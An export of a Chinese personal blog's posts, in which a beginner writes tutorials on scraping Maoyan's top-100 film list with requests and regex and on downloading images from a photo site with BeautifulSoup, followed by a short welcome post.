    <content type="text"><![CDATA[昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。http://maoyan.com/board/4 用到的模块12import requestsimport re 用正则表达式匹配下载当页信息首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。接下来就是写代码用正则把内匹配下来12345678910111213headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125;r = requests.get('http://maoyan.com/board/4?offset=0',headers=headers)results = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S)'''findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替第二个参数是被匹配的文本，传入网页源代码即可因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了''' 再写个循环把提取到的内容写进txt文件即可123456789for i in results: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')'''a表示追加写入，要加上encoding='utf-8'，不然会编码错误i[0] i[1]等表示当前列表里的某个元组的第几个内容我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。''' 写个循环爬取所有页面的内容我们发现网页的地址格式是http://maoyan.com/board/4?offset= + 0,10,20,30…10012345for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i)'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数然后再把上面的代码写成函数，在这个循环里调用即可''' 最后附上全部代码,原谅小白的代码吧。12345678910111213141516import requestsimport redef get_information(url): headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'&#125; r = requests.get(url,headers=headers) result = re.findall( '&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; ', r.text, re.S) for i in result: with open('top100.txt', 'a',encoding='utf-8') as f: f.write(i[0] + ' ' + re.sub('\n\s+', '', str(i[1])) + ' ' + i[2] + ' ' + '评分：' + i[3] + i[4] + '\n')for i in range(0,110,10): url = 'http://maoyan.com/board/4?offset=' + str(i) get_information(url)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初学python爬虫]]></title>
    <url>%2F2018%2F10%2F22%2F%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。http://www.mzitu.com/zipai/ 用到的模块123import requestsfrom bs4 import BeautifulSoupimport os 找到当前页面图片地址首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。先用get方法获取页面内容，再用BeautifulSoup煲汤。1234r = requests.get('http://www.mzitu.com/zipai/')soup = BeautifulSoup(r.text,'lxml') #需要 pip install lxmllist1 = []list1 = soup.select('p &gt; img') 然后再用for循环提取出img的属性1234list2 =[]for i in list1: list2.append(i.get('src')) print(i.get('src')) 下载图片12345678os.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content) 循环每个页面很容易可以观察到，地址的格式是”http://www.mzitu.com/zipai/comment-page-&quot;+ 页数+”/#comments”因此写个for循环即可遍历地址12for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" 再把url传入上面的方法即可。 小问题1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport osos.mkdir('D:/妹子图')os.chdir('D:/妹子图')for i in range(1,365): url ="http://www.mzitu.com/zipai/comment-page-"+ str(i)+"/#comments" r = requests.get(url) soup = BeautifulSoup(r.text,'lxml') list1 = soup.select('p &gt; img') list2 =[] for i in list1: list2.append(i.get('src')) print(i.get('src')) for i in list2: img = requests.get(i) filename = i.split('/')[-1] with open(filename,'wb') as f: f.write(img.content)]]></content>
      <categories>
        <category>python学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Welcome to my blog.]]></title>
    <url>%2F2018%2F10%2F18%2FMy%20first%20blog%2F</url>
    <content type="text"><![CDATA[学校里全是dalao，加油鸭！一定要成为一名牛逼的CTFer！不负自己，未来可期！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
</search>
